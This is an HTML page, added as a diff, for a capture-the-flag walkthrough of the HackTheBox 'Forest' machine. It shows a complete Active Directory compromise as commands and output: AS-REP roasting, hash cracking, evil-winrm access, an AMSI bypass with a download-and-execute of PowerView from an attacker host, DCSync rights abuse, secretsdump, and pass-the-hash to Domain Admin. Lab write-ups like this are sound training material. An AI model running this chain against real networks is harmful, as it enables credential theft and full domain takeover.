@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HackTheBox: Forest - Active Directory Privilege Escalation | Elliot Hacks</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta content="Complete walkthrough of HackTheBox Forest machine. AS-REP roasting, BloodHound analysis, Exchange Windows Permissions abuse, DCSync attack." name="description">
+    <meta content="hackthebox, forest, active-directory, as-rep roasting, dcsync, bloodhound, windows exploitation" name="keywords">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: 'Heebo', sans-serif;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.02; pointer-events: none; }
+        .matrix-column { position: absolute; top: -100%; font-family: 'Fira Code', monospace; font-size: 12px; color: #00ff41; animation: matrix-fall linear infinite; }
+        @keyframes matrix-fall { 0% { top: -100%; } 100% { top: 100%; } }
+        .navigation-header { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(0, 255, 65, 0.3); position: fixed; width: 100%; top: 0; z-index: 1000; }
+        .nav-link-cyber { color: #00ff41 !important; transition: all 0.3s; }
+        .nav-link-cyber:hover { color: #39ff14 !important; text-shadow: 0 0 10px #00ff41; }
+        .writeup-container { margin-top: 100px; min-height: 100vh; }
+        .writeup-header { background: linear-gradient(45deg, rgba(0, 0, 0, 0.8), rgba(26, 26, 46, 0.6)); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 20px; padding: 2rem; margin-bottom: 2rem; }
+        .writeup-title { font-size: 2.5rem; font-weight: 900; color: #00ff41; text-shadow: 0 0 30px rgba(0, 255, 65, 0.5); font-family: 'Orbitron', monospace; }
+        .content-card { background: rgba(0, 0, 0, 0.8); border: 1px solid rgba(0, 255, 65, 0.2); border-radius: 15px; padding: 2rem; margin-bottom: 2rem; }
+        .content-card h2 { color: #00ff41; font-family: 'Orbitron', monospace; border-left: 4px solid #00ff41; padding-left: 1rem; margin-bottom: 1.5rem; }
+        .code-block { background: #0a0a0a; border: 1px solid #00ff41; border-radius: 10px; padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; overflow-x: auto; margin: 1rem 0; }
+        .flag { background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; border-radius: 10px; padding: 0.5rem 1rem; font-family: 'Fira Code', monospace; color: #00ff41; display: inline-block; }
+        .tag { background: rgba(0, 255, 65, 0.1); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 20px; padding: 0.2rem 0.8rem; font-size: 0.8rem; font-family: 'Fira Code', monospace; color: #00ff41; display: inline-block; }
+        @media (max-width: 768px) { .writeup-title { font-size: 1.8rem; } .code-block { font-size: 0.7rem; } }
+    </style>
+</head>
+
+<body>
+    <div class="matrix-bg" id="matrix"></div>
+
+    <header class="navigation-header py-3">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="../../" class="h3 mb-0 nav-link-cyber text-decoration-none">
+                    <i class="fas fa-terminal me-2"></i>@elliot-hacks
+                </a>
+                <nav class="d-none d-md-flex gap-4">
+                    <a href="../../" class="nav-link-cyber text-decoration-none">Home</a>
+                    <a href="../../about.html" class="nav-link-cyber text-decoration-none">About</a>
+                    <a href="../index.html" class="nav-link-cyber text-decoration-none">Publications</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <div class="container writeup-container">
+        <div class="writeup-header">
+            <h1 class="writeup-title">HackTheBox: Forest</h1>
+            <div class="mt-3">
+                <span class="tag"><i class="fas fa-tree me-1"></i>Active Directory</span>
+                <span class="tag ms-2"><i class="fas fa-tag me-1"></i>Windows</span>
+                <span class="tag ms-2"><i class="fas fa-chart-simple me-1"></i>Medium</span>
+                <span class="tag ms-2"><i class="fas fa-key me-1"></i>AS-REP Roasting</span>
+                <span class="tag ms-2"><i class="fas fa-sync me-1"></i>DCSync</span>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-search me-2"></i>Step 1: Service Enumeration</h2>
+            <p>Initial Nmap scan reveals multiple open ports indicating a Domain Controller:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">[msf] >> db_nmap -p- -T5 --min-rate=5000 forest.htb
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws</pre>
+            </div>
+            <p>Version scan reveals Windows Server 2016 Domain Controller:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">Domain: htb.local
+Host: FOREST
+OS: Windows Server 2016 Standard</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-users me-2"></i>Step 2: User Enumeration with RPCClient</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~]
+└──╼ $rpcclient -U "" -N forest.htb
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-key me-2"></i>Step 3: AS-REP Roasting Attack</h2>
+            <p>Using GetNPUsers.py to find vulnerable users:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/forest]
+└──╼ $for user in $(cat users.txt); do python GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}; done
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB:e4e31163e0def012685092f548f549ef$da8aa62e067b869f100cb8ee0b330d81fc49720efdf6116901b8f1067511d2b5a...</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-hashtag me-2"></i>Step 4: Cracking the Hash</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/forest]
+└──╼ $hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$svc-alfresco@HTB:...:<span class="flag">s3rvice</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-terminal me-2"></i>Step 5: Initial Access & User Flag</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/forest]
+└──╼ $evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
+<span class="flag">2449b95aa9ed9d874ec70d537abf86ef</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-chart-line me-2"></i>Step 6: BloodHound Enumeration</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">(venv) ┌─[elliot@parrot]─[~]
+└──╼ $bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161</pre>
+            </div>
+            <p>BloodHound analysis reveals that the user has membership in "Exchange Windows Permissions" group, which can be abused for DCSync attack.</p>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-user-plus me-2"></i>Step 7: Creating User for DCSync</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user elliot Qwerty@123 /add /domain
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" elliot /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" elliot /add
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring("http://10.10.14.10:8000/PowerView.ps1")
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity elliot -Rights DCSync</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-database me-2"></i>Step 8: Dumping Hashes with Secretsdump</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">(venv) ┌─[elliot@parrot]─[~/forest]
+└──╼ $impacket-secretsdump htb/elliot@10.10.10.161
+
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="flag">32693b11e6aa90eb43d32c72a07ceea6</span>:::</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-crown me-2"></i>Step 9: Root Flag</h2>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">(venv) ┌─[elliot@parrot]─[~/forest]
+└──╼ $impacket-psexec administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
+
+C:\Users\Administrator\Desktop>type root.txt
+<span class="flag">71869984c0547b4eb8a1578f54924c9e</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-clipboard-list me-2"></i>Key Takeaways</h2>
+            <ul>
+                <li><strong class="text-success">AS-REP Roasting</strong> - Exploiting users without Kerberos preauthentication</li>
+                <li><strong class="text-success">BloodHound</strong> - AD attack path visualization</li>
+                <li><strong class="text-success">Exchange Windows Permissions</strong> - Abusing group membership for DCSync</li>
+                <li><strong class="text-success">DCSync Attack</strong> - Replicating domain credentials</li>
+            </ul>
+            <hr>
+            <p class="mb-0"><i class="fas fa-shield-alt me-2"></i>This machine demonstrates privilege escalation from a standard domain user to Domain Admin using DCSync rights.</p>
+        </div>
+    </div>
+
+    <script>
+        function createMatrixRain() {
+            const matrix = document.getElementById('matrix');
+            const chars = '01';
+            for (let i = 0; i < 30; i++) {
+                const col = document.createElement('div');
+                col.className = 'matrix-column';
+                col.style.left = Math.random() * 100 + '%';
+                col.style.animationDuration = (Math.random() * 4 + 2) + 's';
+                col.style.animationDelay = Math.random() * 5 + 's';
+                let text = '';
+                for (let j = 0; j < 15; j++) text += chars.charAt(Math.floor(Math.random() * chars.length)) + '<br>';
+                col.innerHTML = text;
+                matrix.appendChild(col);
+            }
+        }
+        createMatrixRain();
+    </script>
+</body>
+</html>
